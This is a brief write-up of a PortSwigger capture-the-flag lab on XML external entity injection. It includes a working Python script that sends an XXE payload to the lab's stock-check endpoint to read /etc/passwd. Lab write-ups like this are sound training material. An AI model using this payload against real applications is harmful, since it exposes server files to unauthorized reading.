# Portswigger CTF - XXE External Entities Injection
## 2023-12-30, Joakim Oscarsson

### Problem description
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 

### What is XXE
XXE stands for XML External Entities. The goals is to inject a custom entity in the DTD (Document Type Definition) to get the
etc/passwd file.

### Working python code
```python
import requests

url = "https://0a240055034bb89f803ba81d008b0068.web-security-academy.net/product/stock"

payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY msg SYSTEM "file:///etc/passwd" > ]>
<stockCheck><productId>&msg;</productId><storeId>1</storeId></stockCheck>'''

response = requests.post(url, 
    data=payload,
    headers={"Content-Type": "application/xml"},
)

print(response.text)
```
